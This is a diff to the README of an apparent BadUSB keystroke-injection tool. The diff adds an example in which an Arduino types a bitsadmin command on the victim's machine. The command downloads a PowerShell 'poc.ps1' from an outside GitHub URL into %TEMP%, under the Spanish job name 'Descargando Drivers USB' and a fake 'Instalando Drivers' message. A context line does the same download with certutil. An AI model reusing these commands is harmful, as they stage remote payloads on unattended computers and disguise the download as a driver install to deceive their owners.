@@ -233,6 +233,12 @@ Example:
 Keyboard.println(" FOR /F \"delims=/ tokens=1\" %a IN ('where certutil')DO %a -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"Documents/poc.ps1\" ");
 ```
 
+## Example with bitsadmin
+
+```c
+Keyboard.println(" bitsadmin /transfer \"Descargando Drivers USB\" /download /priority high \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" %TEMP%/poc.ps1 && echo Instalando Drivers: ");
+```
+
 ### Telegram Options
 
 #### Basic
